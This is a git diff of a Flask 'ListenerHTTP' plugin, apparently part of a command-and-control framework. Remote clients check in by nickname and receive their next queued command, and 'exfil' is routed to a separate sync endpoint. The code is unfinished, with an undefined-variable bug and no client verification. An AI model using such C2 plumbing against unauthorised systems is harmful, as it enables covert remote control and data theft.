@@ -4,11 +4,13 @@ import sys
 import os
 import logging
 from types import SimpleNamespace
-from flask import jsonify, make_response, Flask, request
+from flask import jsonify, make_response, Flask, request, redirect, url_for
 import inspect
 # Scraping one file standalone for now. Public Plugins will still comm over http. 
 # Can just adjust imports for standalone mode in a diff file.
-from Utils.Logger import LoggingSingleton
+#from Utils.Logger import LoggingSingleton
+# WHY U NO WORK
+from PluginEngine.PublicPlugins.ListenerHTTP.Utils.Logger import LoggingSingleton
 from PluginEngine.PublicPlugins.ListenerHTTP.Utils.DataSingleton import Data
 from PluginEngine.PublicPlugins.ListenerHTTP.Utils.ActionLogger import ActionLogger
 from PluginEngine.PublicPlugins.ListenerHTTP.Modules.Client import Client
@@ -94,25 +96,24 @@ class ListenerHTTP:
 
         return make_response(dummy_request_json, 200)
 
+        # steps;
+            # pop next command for client from client name
 
     def listener_http_post_endpoint(self):
         '''
-            Initial checkin endpoint. Registers client if new, and gives URL for client to use going forward
+            Initial checkin endpoint. Registers client if new ~~, and gives URL for client to use going forward~~
 
-            this function needs to be broken up, into generating a dynamic URL for hte clietns to go to (maybe redirect them - need to think that out) - or just emit this entirely to start
-            and get the next command queued for them. 
-
-            For now using a dummy_request
+            ONLY used for checking in, and client getting next command. All exfil/responses are sent to the SYNC endpoint. 
         
         '''
-
         #####
             ## New Chain
             # Recieve request
             # Parse request. 
-            # store request - somewhere = send to server w sync
             # Get new item in listener queue (from client class)
             # return response to client.
+
+            ##Still need some form of client verification.
 
 
         #####
@@ -123,57 +124,24 @@ class ListenerHTTP:
             return jsonify({"error": "Invalid or no JSON received"}), 400
 
         data_dict = dict(data)
+        print(data_dict)
 
-        ## If client does *not* exist, add to client list
-        #NOTE!!!! This key does not exist yet. Need to think it out more, either keep it under ersult, or let it be atop
-        # level key
-        if not self.data_singleton.Data.Clients.check_if_client_exists(data_dict["result"]["client_name"]):
-            ## if not:
-                # add to singleton or somewhere with client name
-            client_instance = Client(app=self.app, action_logger=ActionLogger())
+        # fast handling for the ClientInfo type in the vessel
+        client_nickname = data_dict["data"]["ClientInfo"]["nickname"]
+        self.logger.info(f"Client connected: {client_nickname}")
+
+        if not self.data_singleton.Clients.check_if_client_exists(client_name=client_nickname):
+            self.logger.debug(f"New client: {client_nickname}")
+            client_instance = Client(client_nickname)
 
         client_instance.set_response(response=data_dict)
-
-            # get next command
+        # get next command
         client_command = client_instance.dequeue_command()
-
         # return command to client
+        self.logger.debug(f"Responding to client {client_nickname}")
         return make_response(jsonify(client_command), 200)
-    
 
-        '''
-
-        # Get JSON data
-        data = request.json
-
-        if data is None:
-            return jsonify({"error": "Invalid or no JSON received"}), 400
-
-        # Convert JSON data to a dictionary
-        data_dict = dict(data)
-        
-        # Optionally, convert to SimpleNamespace for attribute-style access
-        data_ns = SimpleNamespace(**data_dict)
-
-        print(data_ns)
-
-        # Example usage of the namespace
-        print(data_ns.response_id)  # Access attributes directly
-        #print(data_ns.result.data)  # Nested data access
-
-        # Temp here, create response back to client
-        dummy_request = HTTPJsonRequest()
-        dummy_request.callback.server.hostname = "callbackserver" # pull this from the singleton somehwere
-        dummy_request_json = dummy_request.generate_json()
-
-        # send response back
-        return make_response(dummy_request_json, 200)
-        ## Handling Data - Temp here, move to diff function once the dynamic URL is set/thought about.
-
-        #self.client_checkin_validation("data")
-        #return make_response("POST ENDPOINT - JSON HERE", 200)
-        '''
-
+    ## sync DOES NOT return any response besides okay/bad.
     def listener_http_sync_endpoint(self):
         """
             End point where server can queue commands for listener/clients. Sync/Ingest endpoint. 
@@ -202,24 +170,6 @@ class ListenerHTTP:
 
         # return ok 
         return api_response(status_code=200, status="success")
-
-
-    def client_checkin_validation(self):
-        pass
-        # check if client exists, via query to main server DB
-
-        # if not exists, create in main Server db
-
-        # create class instance
-        #new_client = Client(data)
-
-        # add to dict of current clients. key is name
-        
-        '''
-        
-        self.data_singleton.Clients.add_new_client(new_client_stuff)
-
-        '''
     
 
 
